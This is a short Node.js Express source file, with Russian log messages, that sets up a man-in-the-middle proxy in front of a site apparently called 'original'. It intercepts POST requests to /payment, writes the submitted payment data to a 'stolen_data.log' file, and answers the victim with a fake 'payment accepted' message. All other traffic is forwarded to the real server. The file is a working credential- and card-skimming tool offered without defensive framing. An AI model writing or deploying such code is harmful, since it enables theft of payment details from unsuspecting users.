import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import httpProxy from 'http-proxy';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 8081;
const proxy = httpProxy.createProxyServer({});

app.use(express.json());
app.use(express.urlencoded({ extended: true })); 

const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir);
}

function logStolen(data) {
    console.log("ПЕРЕХВАЧЕНЫ ДАННЫЕ:", data);
    
    const logEntry = `${new Date().toISOString()} - ${JSON.stringify(data)}\n`;
    fs.appendFileSync(path.join(logDir, 'stolen_data.log'), logEntry);
}

app.use(express.static(path.join(__dirname, "public")));

app.post("/payment", (req, res) => {
    const data = req.body;
    
    logStolen(data);
    
    res.json({ 
        status: "success", 
        message: "Оплата принята"
    });
});

app.use((req, res) => {
    console.log(`MITM: Прокся ${req.method} ${req.url}`);
    proxy.web(req, res, { 
        target: 'http://original:8080',
        changeOrigin: true 
    });
});

proxy.on('error', (err, req, res) => {
    console.log('Прокси ошибка:', err.message);
    res.status(500).send('Server error');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`mitm сервер → http://localhost:8081`);
});